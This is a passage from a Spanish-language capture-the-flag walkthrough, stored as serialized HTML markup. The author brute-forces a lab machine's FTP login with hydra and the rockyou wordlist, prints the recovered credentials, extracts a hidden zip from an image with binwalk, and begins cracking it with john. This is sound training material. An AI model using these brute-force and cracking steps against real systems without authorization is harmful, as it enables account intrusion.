<br><br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"From,<br>\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent R\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos el nombre de usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"chris"}]},{"type":"text","value":" y que su contrase帽a es d茅bil."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Si intentamos enumerar directorios y paginas web, tales como formularios de inicio de sesi贸n, no obtendremos resultados."}]},{"type":"element","tag":"h2","props":{"id":"explotaci贸n"},"children":[{"type":"text","value":"Explotaci贸n"}]},{"type":"element","tag":"h3","props":{"id":"ssh"},"children":[{"type":"text","value":"驴SSH?"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al no encontrar un vector de explotaci贸n evidente, usaremos "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"hydra"}]},{"type":"text","value":" para obtener la contrase帽a del servicio "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"SSH"}]},{"type":"text","value":" mediante fuerza bruta."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Iniciar sesi贸n en este servicio corresponde al camino hacia el 茅xito mas directo, por tanto tiene sentido probar un ataque de fuerza bruta primero con este servicio. Pero en un entorno real este servicio estar谩 fuertemente protegido y monitorizado, por lo que deber铆amos de probar en otros lugares primero."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Finalmente, este ataque falla en obtener una contrase帽a valida en un intervalo de tiempo aceptable."}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Nunca debes realizar un ataque de fuerza bruta, a menos que sea el 煤nico camino disponible o hayan grandes indicios de que este es el camino correcto."}]}]},{"type":"element","tag":"h3","props":{"id":"ftp"},"children":[{"type":"text","value":"FTP"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Al fallar el anterior ataque, esta vez lo intentaremos en el servicio "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":", haciendo uso de la famosa lista de palabras "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"rockyou.txt"}]},{"type":"text","value":"."}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Si hay indicios de que una contrase帽a es d茅bil, vale la pena usar listas de palabras conocidas como rockyou.txt (solo en CTFs)."}]}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"hydra"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -l"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"chris\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -P"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" /usr/share/wordlists/rockyou.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -f"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -vV"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" ftp\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"hydra:"}]},{"type":"text","value":" "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"Cracker"}]},{"type":"text","value":" de inicios de sesi贸n paralelos que soporta numerosos protocolos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-l [usuario]:"}]},{"type":"text","value":" Nombre de usuario a iniciar sesi贸n."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-P: [lista de palabras]"}]},{"type":"text","value":" Ruta del archivo con contrase帽as a probar."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-f:"}]},{"type":"text","value":" Parar despu茅s del primer inicio de sesi贸n valido."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-vV:"}]},{"type":"text","value":" Salida muy verbal."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n\n[...]\n[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n[STATUS] attack finished for 10.10.195.209 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[STATUS] attack finished for 10.10.195.209 (valid pair found)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"1 of 1 target successfully completed, 1 valid password found\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Obtenemos la contrase帽a "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"crystal"}]},{"type":"text","value":". Ingresamos al servidor "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":" con estas credenciales y listamos los archivos."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ftp> ls\n229 Entering Extended Passive Mode (|||6987|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt\n-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n226 Directory send OK.\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> ls\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"229 Entering Extended Passive Mode (|||6987|)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"150 Here comes the directory listing.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"226 Directory send OK.\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El servidor "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":" contiene tres archivos: Dos im谩genes y un archivo de texto. Los descargamos de forma recursiva."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ftp> prompt\nInteractive mode off.\nftp> mget .\nlocal: To_agentJ.txt remote: To_agentJ.txt\n[...]\nlocal: cute-alien.jpg remote: cute-alien.jpg\n[...]\nlocal: cutie.png remote: cutie.png\n[...]\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> prompt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Interactive mode off.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> mget .\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: To_agentJ.txt remote: To_agentJ.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: cute-alien.jpg remote: cute-alien.jpg\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: cutie.png remote: cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Usamos el comando "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"promt"}]},{"type":"text","value":" para evitar tener que confirmar manualmente la descarga de cada archivo."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"A simple vista, no hay nada fuera de lo usual en las im谩genes descargadas. El archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"To_agentJ.txt"}]},{"type":"text","value":" contiene el siguiente mensaje."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Dear agent J,\n\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n\nFrom,\nAgent C\n","filename":"To_agentJ.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Dear agent J,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"From,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent C\n"}]}]}]}]},{"type":"element","tag":"h3","props":{"id":"esteganograf铆a"},"children":[{"type":"text","value":"Esteganograf铆a"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Seg煤n el mensaje anterior, una de las im谩genes contiene la contrase帽a de Agent R. Debemos realizar estegoan谩lisis en busca de un mensaje escondido. Podemos realizar este proceso con muchas herramientas, pero en CTFs usualmente podremos obtener informaci贸n oculta haciendo uso de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"exiftool"}]},{"type":"text","value":", "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":", "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":" y "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"steghide"}]},{"type":"text","value":" (no esperes hacer uso de estas herramientas en pruebas de penetraci贸n reales)."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La herramienta "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"exiftool"}]},{"type":"text","value":" no revela nada importante en ambas im谩genes. Pero "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" revela algo en la imagen "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"cutie.png"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" head"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":"echo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \".....\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" tail"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"strings:"}]},{"type":"text","value":" Mostrar cadenas de texto legibles para humanos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"head:"}]},{"type":"text","value":" Mostrar las primeras 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las primeras lineas."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"tail:"}]},{"type":"text","value":" Mostrar las ultimas 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las ultimas lineas."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n\n[...]\nTo_agentR.txt\nW\\_z#\n2a>=\nTo_agentR.txt\nEwwT\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"W\\_z#\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"2a>=\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"EwwT\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos que "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"cutie.png"}]},{"type":"text","value":" contiene un archivo de texto incrustado. Para extraerlo hacemos uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"binwalk -e cutie.png\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"binwalk"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -e"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"binwalk:"}]},{"type":"text","value":" Buscar archivos incrustados en binarios."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-e:"}]},{"type":"text","value":" Extraer autom谩ticamente tipos de archivos conocidos (requiere de las herramientas adecuadas instaladas)."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"binwalk -e cutie.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n869           0x365           Zlib compressed data, best compression\n\nWARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"binwalk -e cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"DECIMAL       HEXADECIMAL     DESCRIPTION\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"--------------------------------------------------------------------------------\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"869           0x365           Zlib compressed data, best compression\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"WARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Los archivos fueron extra铆dos en la carpeta "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"_cutie.png.extracted"}]},{"type":"text","value":". Dentro de esta carpeta encontramos el archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"8702.zip"}]},{"type":"text","value":" que no pudo ser extra铆do autom谩ticamente. Sin embargo "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"unzip"}]},{"type":"text","value":" falla en extraer este archivo, por lo que debemos de usar "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"7zip"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"7zip x 8702.zip\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"7zip"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" x"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" 8702.zip\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"7zip:"}]},{"type":"text","value":" Software para comprimir y descomprimir archivos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"x:"}]},{"type":"text","value":" Extraer archivo."}]}]}]},{"type":"element","tag":"h3","props":{"id":"crackeo-de-zip"},"children":[{"type":"text","value":"Crackeo de zip"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"8702.zip"}]},{"type":"text","value":" esta protegido por una contrase帽a. Para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"crackearla"}]},{"type":"text","value":", primero debemos debemos de convertir el archivo ZIP en un formato adecuado para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"john"}]},{"type":"text","value":" haciendo uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"zip2john"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"zip2john 8702.zip > zip2john.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"zip2john"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" 8702.zip"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" >"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" zip2john.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"zip2john [archivo]:"}]},{"type":"text","value":" Convertir archivo ZIP en un formato adecuado para "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"john"}]},{"type":"text","value":"."}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"Crackeamos"}]},{"type":"text","value":" la contrase帽a con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"john"}]},{"type":"text","value":" haciendo uso del archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"zip2john.txt"}]},{"type":"text","value":" generado anteriormente y la lista de palabras "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"rockyou.txt"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"john"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" --wordlist=/usr/share/wordlists/rockyou.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" zip2john.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicaci贸n del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"john:"}]},{"type":"text","value":" Recuperador de contrase帽as."}]},{"type":"text","value":"\n        